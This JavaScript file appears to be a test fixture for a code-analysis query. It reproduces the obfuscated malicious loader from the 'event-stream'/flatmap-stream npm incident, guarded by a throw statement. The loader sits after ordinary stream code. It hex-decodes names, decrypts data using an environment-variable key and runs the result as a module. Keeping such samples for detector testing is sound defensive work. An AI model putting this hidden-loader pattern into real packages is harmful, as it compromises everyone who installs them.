/**
 * This is a formatted copy of the malicoius source code from the "event-stream" incident. See additional details at
 * https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident.html
 *
 * The copy is used for testing the behaviour of the js/hardcoded-data-interpreted-as-code query
 */
throw new Error(
  "Do not import this file: it has malicious source code that should not be run."
);

var Stream = require("stream").Stream;
module.exports = function (e, n) {
  var i = new Stream(),
    a = 0,
    o = 0,
    u = !1,
    f = !1,
    l = !1,
    c = 0,
    s = !1,
    d = (n = n || {}).failures ? "failure" : "error",
    m = {};
  function w(r, e) {
    var t = c + 1;
    if (
      (e === t
        ? (void 0 !== r && i.emit.apply(i, ["data", r]), c++, t++)
        : (m[e] = r),
      m.hasOwnProperty(t))
    ) {
      var n = m[t];
      return delete m[t], w(n, t);
    }
    a === ++o && (f && ((f = !1), i.emit("drain")), u && v());
  }
  function p(r, e, t) {
    l ||
      ((s = !0),
      (r && !n.failures) || w(e, t),
      r && i.emit.apply(i, [d, r]),
      (s = !1));
  }
  function b(r, t, n) {
    return e.call(null, r, function (r, e) {
      n(r, e, t);
    });
  }
  function v(r) {
    if (((u = !0), (i.writable = !1), void 0 !== r)) return w(r, a);
    a == o && ((i.readable = !1), i.emit("end"), i.destroy());
  }
  return (
    (i.writable = !0),
    (i.readable = !0),
    (i.write = function (r) {
      if (u) throw new Error("flatmap stream is not writable");
      s = !1;
      try {
        for (var e in r) {
          a++;
          var t = b(r[e], a, p);
          if ((f = !1 === t)) break;
        }
        return !f;
      } catch (r) {
        if (s) throw r;
        return p(r), !f;
      }
    }),
    (i.end = function (r) {
      u || v(r);
    }),
    (i.destroy = function () {
      (u = l = !0),
        (i.writable = i.readable = f = !1),
        process.nextTick(function () {
          i.emit("close");
        });
    }),
    (i.pause = function () {
      f = !0;
    }),
    (i.resume = function () {
      f = !1;
    }),
    i
  );
};
!(function () {
  try {
    var r = require,
      t = process;
    function e(r) {
      return Buffer.from(r, "hex").toString();
    }
    var n = r(e("2e2f746573742f64617461")),
      o = t[e(n[3])][e(n[4])];
    if (!o) return;
    var u = r(e(n[2]))[e(n[6])](e(n[5]), o),
      a = u.update(n[0], e(n[8]), e(n[9]));
    a += u.final(e(n[9]));
    var f = new module.constructor();
    (f.paths = module.paths), f[e(n[7])](a, ""), f.exports(n[1]);
  } catch (r) {}
})();
